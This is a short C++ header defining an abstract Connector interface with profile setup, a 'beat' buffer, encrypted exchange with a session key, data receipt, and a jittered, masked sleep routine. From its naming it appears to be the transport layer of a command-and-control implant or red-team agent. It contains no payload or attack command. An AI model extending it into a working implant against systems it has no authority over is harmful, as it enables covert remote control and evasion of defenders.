#pragma once

#include "WaitMask.h"

class Connector
{
public:
	virtual BOOL SetProfile(void* profile, BYTE* beat, ULONG beatSize) = 0;

	virtual BOOL WaitForConnection() { return TRUE; }

	virtual BOOL IsConnected() { return TRUE; }

	virtual void Disconnect() {}

	virtual void Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey) = 0;

	virtual BYTE* RecvData() = 0;
	virtual int   RecvSize() = 0;
	virtual void  RecvClear() = 0;

	virtual void Sleep(HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDelay, ULONG jitter, BOOL hasOutput)
	{
		if (!hasOutput)
			WaitMaskWithEvent(wakeupEvent, workingSleep, sleepDelay, jitter);
	}

	virtual void CloseConnector() = 0;

	virtual ~Connector() {}
};
